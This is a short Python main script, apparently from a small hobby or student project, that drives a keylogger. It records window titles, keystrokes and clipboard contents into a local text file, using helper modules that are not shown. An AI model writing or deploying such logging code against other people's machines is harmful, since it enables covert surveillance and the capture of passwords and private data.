########################################################################################################################
#               This is the main.py for this project where the core of the project's code should be.                   #
#               Try to keep the code as modular as possible by separating it into functions and classes.               #
#                                                                                                                      #
#               - Keano (03-04-2023)                                                                                   #
########################################################################################################################

# Library imports here
import window_info_logger as wilogger
import keystrokes_and_clipboard_logger as kclogger
import keyboard as kb
import os


# Main code here
def main():
    if os.path.isfile("test.txt"):
        os.remove("test.txt")

    with open('test.txt', 'a+', encoding="utf-8") as f:
        wilogger.initialise_log_file(f)
        kclogger.start_keylogger(f)
        last_window_title = None
        while True:
            active_window_title = wilogger.active_window_title_grabber()
            if active_window_title != last_window_title:
                kclogger.stop_keylogger()  # Might not be necessary. Should be tested without this to see if the program is fast enough to note the application name before newly pressed keys.
                # BUG/TODO: If no logged keys since previous window, then remove \n at the start of the following:
                f.write(f"OPENED {active_window_title} \n")
                kclogger.start_keylogger(f)  # Start keylogger again for next loop.
                last_window_title = active_window_title  # TODO: Being called upon twice. Necessary?

            kclogger.log_clipboard(f)


if __name__ == '__main__':
    main()
